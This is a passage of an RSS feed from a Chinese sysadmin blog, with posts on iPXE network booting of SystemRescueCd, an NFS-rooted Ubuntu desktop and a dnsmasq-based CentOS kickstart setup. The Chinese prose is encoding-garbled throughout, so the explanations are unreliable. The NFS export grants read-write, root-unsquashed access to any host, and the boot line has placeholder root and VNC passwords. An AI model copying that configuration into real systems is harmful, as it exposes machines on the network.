&lt;p&gt;&lt;img alt=&#34;image-20240118141641267&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240118-ipxe_hiren/image-20240118141641267.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>IPXEè¿œç¨‹è¿è¡Œsysrecuecdç³»ç»Ÿ</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_sysrecuecd/</link>
      <pubDate>Thu, 18 Jan 2024 13:50:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_sysrecuecd/</guid>
      <description>&lt;p&gt;æ—¢ç„¶ç”¨åˆ°ipxeï¼Œå°±è¯•è¯•è¿œç¨‹è¿è¡Œ&lt;code&gt;systemrecuecd&lt;/code&gt;ã€‚ä¸‡ä¸€ç³»ç»Ÿå‡ºæ¯›ç—…ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æˆ–è€…æ€¥æ•‘ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½cd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è£…è¿› http://172.168.8.1/ks/sysrcdç›®å½•ä¸­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /var/www/html/ks/sysrcd  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp -r /mnt/iso/* /var/www/html/ks/sysrcd  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¤´æˆï¼Œä¾ç„¶æŒ‰å‰é¢çš„æ–¹æ³•ä¿®æ”¹boot2.phpå³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\ec:f4:bb:d9:96:40&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;explode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;,&lt;span class=&#34;nv&#34;&gt;$ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ifopen net0\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/ip &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[0]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/netmask &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[2]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/gateway &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[1]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/dns &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dns&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set base-url http://172.16.8.1/ks/sysrcd\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;kernel \${base-url}/isolinux/rescue32 netboot=\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;initrd &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/isolinux/initram.igz\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;boot\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼Œé™æ€ipçš„è®¾ç½®éƒ¨åˆ†ï¼Œè¿˜æœ‰åŒæ—¶è®¾ç½®äº†sshdå’Œvncserverï¼Œæ–¹ä¾¿è¿œç¨‹æ“ä½œã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨IPXEå¯åŠ¨ä¸ªUbuntuæ¡Œé¢</title>
      <link>https://rendoumi.com/posts/20240118-pxe_utuntu_desk/</link>
      <pubDate>Thu, 18 Jan 2024 13:40:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-pxe_utuntu_desk/</guid>
      <description>&lt;p&gt;æœ‰äº†ä¸Šç¯‡IPXEçš„å¯åŠ¨æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥å¯åŠ¨ä¸€ä¸ªUbuntuæ¥ç©ï¼š&lt;/p&gt;
&lt;p&gt;ç®€å•çš„ä¿®æ”¹boot2.phpå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\ec:f4:bb:d9:96:40&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;explode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;,&lt;span class=&#34;nv&#34;&gt;$ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ifopen net0\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/ip &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[0]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/netmask &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[2]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/gateway &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ipa&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[1]\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set net0/dns &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dns&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;boot\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼šå˜çš„å°±æ˜¯&lt;code&gt;kernel&lt;/code&gt;å’Œ&lt;code&gt;init&lt;/code&gt;é‚£ä¸¤è¡Œï¼Œnetbootæ”¯æŒnfså’Œcifsï¼Œä¸æ”¯æŒhttpå•Šï¼Œè¯•äº†åŠå¤©ï¼å¦å¤–ipé‚£ä¸€è¡Œï¼Œå¦‚æœæ˜¯åŠ¨æ€çš„ï¼Œip=dhcpï¼Œå¦‚æœæ˜¯é™æ€çš„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ip=å®¢æˆ·ç«¯ip:æœåŠ¡å™¨ç«¯ip:ç½‘å…³:æ©ç :ä¸»æœºå:ç½‘å¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨ç«¯ipä¸å¡«ï¼Œä¸»æœºåä¹Ÿå¯ä»¥ä¸å¡«ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬è¦å»ä¸‹ä¸ªISO&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæŠŠvmlinuz.efiå’Œinitrd.lzå¼„å‡ºæ¥ï¼Œæ”¾åˆ°[&lt;a href=&#34;http://172.16.8.1/ks/ubuntu&#34;&gt;http://172.16.8.1/ks/ubuntu&lt;/a&gt;]ç›®å½•ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå»ºç«‹nfsï¼ŒæŠŠisoé‡Œçš„ä¸œè¥¿éƒ½å¼„åˆ°nfså…±äº«é‡Œå»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /export/ubuntu  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/exports  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/ubuntu *&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw,sync,no_subtree_check,fsid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0,no_root_squash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y nfs-utils rpcbind  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service nfs start  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œå¯åŠ¨pxeï¼Œå°±çœ‹åˆ°æ¡Œé¢äº†ã€‚
&lt;img alt=&#34;image-20240118135302316&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240118-pxe_utuntu_desk/image-20240118135302316.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>IPXE kickstartå®‰è£…CentOSçš„æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_install/</link>
      <pubDate>Thu, 18 Jan 2024 13:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_install/</guid>
      <description>&lt;p&gt;è¿™äº›å¹´IDCç‰©ç†æœºè£…æœºçš„å¤§æ³•ä¹Ÿåœ¨ä¸æ–­è¡è¿›ï¼Œä»æœ€æ—©çš„æ‰‹åŠ¨è£…ä¸€å †tftp/dhcp/syslinux/httpdï¼Œåˆ°cobblerçš„ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œåˆ°ç°åœ¨çš„dnsmasqè½»é‡çº§å®‰è£…ï¼Œnocpså®‰è£…ï¼Œä¸€ç›´åœ¨ä¸æ–­è¿›åŒ–ç€ã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºcobblerå®åœ¨å¤ªé‡ï¼Œä¸å¾—ä¸ä¸“é—¨èµ·ä¸€ä¸ªkvmè™šæœºæ¥è¿è¡Œï¼Œå®Œå…¨ä¸å–œæ¬¢å•Šã€‚æ‰€ä»¥ä¸€ç›´ä¹Ÿåœ¨ç ”ç©¶ç»ˆæå®‰è£…æœåŠ¡å™¨çš„å¤§æ³•ã€‚&lt;/p&gt;
&lt;p&gt;æŠ˜è…¾æœåŠ¡å™¨æ— æ•°å›ï¼Œæ‰¾å‡ºäº†ä¸ªè‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PXE
å¯ä»¥é€šè¿‡ç½‘ç»œç»™è®¡ç®—æœºå®‰è£…æ“ä½œç³»ç»Ÿã€‚ PXEåè®®å¤§è‡´ä¸Šç»“åˆäº†DHCPå’ŒTFTPã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gPXE
gPXEæ˜¯PXEçš„ä¸€ä¸ªå¼€æºå®ç°ï¼ˆæ›´æ—©çš„å®ç°æ˜¯Etherbootï¼‰ã€‚é€šè¿‡gPXEèƒ½è®©ç½‘å¡ç›´æ¥æ”¯æŒç½‘ç»œå¯åŠ¨ï¼Œè€Œä¸ä¾èµ–äºç½‘å¡è‡ªå¸¦çš„PXEå›ºä»¶ã€‚åŒæ—¶ç›¸æ¯”PXEï¼ŒgPXEæ”¯æŒæ›´å¤šçš„åè®®ã€‚ ä¼ ç»Ÿçš„PXEåªèƒ½é€šè¿‡TFTPè¿›è¡Œä¼ è¾“ï¼Œè€ŒgPXEæ”¯æŒHTTPï¼ŒiSCSIå’ŒATA over Ethernetï¼ˆAoEï¼‰ï¼Œç”šè‡³æ”¯æŒwifié“¾æ¥ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;iPXE
iPXEè¡¨ç¤º it doesn&amp;rsquo;t PXEã€‚iPXEæ˜¯gPXEçš„åŸç­äººé©¬å†™çš„ï¼ˆä»–ä»¬ä»Etherbootå¼€å§‹ï¼‰ï¼Œä½œä¸ºå®˜æ–¹çš„gPXEçš„æ›¿ä»£å“ã€‚  gPXEæ‰©å±•çš„åŠŸèƒ½åœ¨iPXEä¸­éƒ½å¾—åˆ°æ”¯æŒã€‚ ä¹‹æ‰€ä»¥ä¸å†ä½¿ç”¨gPXEæ˜¯ç”±äºå­˜åœ¨ç‰ˆæƒçº çº·ï¼ŒiPXEä»2010å¹´4æœˆå¼€å§‹ï¼ŒåŸºäºåŒä¸€ä¸ªä»£ç åº“å¼€å§‹å¼€å‘ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PXELINUX
Syslinuxæ˜¯ä¸€ä¸ªä¼˜ç§€çš„ç³»ç»Ÿå¯åŠ¨åŠ è½½å™¨(bootloader)ï¼Œå¯å¼•å¯¼è‡ªç¡¬ç›˜ã€å…‰ç›˜ã€å’Œé€šè¿‡PXEçš„ç½‘ç»œå¯åŠ¨ã€‚  PXELINUXæ´¾ç”Ÿè‡ªSyslinuxï¼Œç”¨æ¥ä½¿æ”¯æŒPXEçš„ç½‘å¡ä»ç½‘ç»œå¼•å¯¼å¯åŠ¨Linuxã€‚PXELINUXç¨‹åºä¸æ˜¯çƒ§åœ¨ç½‘å¡é‡Œï¼Œè€Œæ˜¯å­˜å‚¨åœ¨TFTPæœåŠ¡å™¨ä¸Šã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Chainloading iPXE
å¯ä»¥æŠŠiPXEå½“ä½œå›ºä»¶åˆ·è¿›è®¡ç®—æœºç½‘å¡çš„ROMé‡Œæ›¿æ¢æ‰è‡ªå¸¦çš„PXEï¼Œä½†æ›´ä¸ºå¸¸è§çš„æ˜¯é€šè¿‡chainloadingçš„æ–¹å¼è¿›å…¥iPXEã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ‰ç‚¹æ™•æ˜¯å§ï¼Œæ€»ç»“ä¸€ä¸‹ï¼ŒpxeåŒ…å«äº†gpxe/ipxe/pxelinuxï¼Œipxeæ˜¯æœ€æ–°çš„ï¼Œgpxe/ipxe/pxelinuxå¯ä»¥é€šè¿‡chainçš„æ–¹å¼é¡¶æ›¿ç½‘å¡åŸç”Ÿçš„pxeã€‚&lt;/p&gt;
&lt;p&gt;æ¨èçš„è£…æœºæ–¹å¼ï¼š&lt;/p&gt;
&lt;p&gt;å®¢æˆ·æœºå¯åŠ¨ç½‘å¡è‡ªå¸¦çš„å›ºä»¶pxeï¼Œç„¶åå»æœåŠ¡å™¨æ‹‰ä¸€ä¸ªgpxe/ipxeï¼Œç„¶åå¯åŠ¨è¿™ä¸ªgpxe/ipxeï¼Œå†å»æœåŠ¡å™¨æ‹‰å…·ä½“çš„å¯åŠ¨æ–‡ä»¶ï¼Œè¿™ç§å°±æ˜¯chainæ–¹å¼äº†ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°http/iscsi/wifiç­‰å„ç§å…ˆè¿›æ–¹å¼å¯åŠ¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç¬¬ä¸€æ­¥å…ˆè¦å‡†å¤‡ä¸€ä¸ªgpxeçš„bootæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼Œæ–‡ä»¶åç¼€æœ‰.pxe/.kpxe/.kkpxeï¼Œè¿™æ˜¯ä¸ªé€’è¿›å…³ç³»ï¼Œ.pxeæ˜¯æœ€åŸç”Ÿçš„ç½‘å¡é©±åŠ¨ï¼Œ.kpxeåŒ…å«äº†è°ƒç”¨åŸç”Ÿç½‘å¡çš„UNDIé©±åŠ¨(æ— ç½‘å¡é©±åŠ¨ï¼‰ï¼Œ.kkpxeæ›´è¿›ä¸€æ­¥ï¼ŒåŒ…å«äº†UNDI+PXEåŸç”Ÿç½‘å¡çš„é©±åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶é€‰æ‹©.kpxeäº†ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡è¿™ä¸ªipxeè°ƒç”¨åŸç”Ÿç½‘å¡ä¸Šçš„é©±åŠ¨å³å¯ï¼Œå¦‚æœæ˜¯ä½ è‡ªå·±è¦çƒ§ç½‘å¡çš„bootroomç‰‡å­ï¼Œå°±å¾—é€‰æ‹©æ‰€æœ‰é©±åŠ¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª gpxe-1.0.1-undionly.kpxe çš„æ–‡ä»¶ï¼Œä¿å­˜å¤‡ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬æ¥è®¾ç½®Dnsmasq:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-dhcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-no-override
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;enable-tftp  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tftp-root &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /tftpboot
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-range&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tftp,172.16.36.100,172.16.36.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-match&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;gpxe,175  
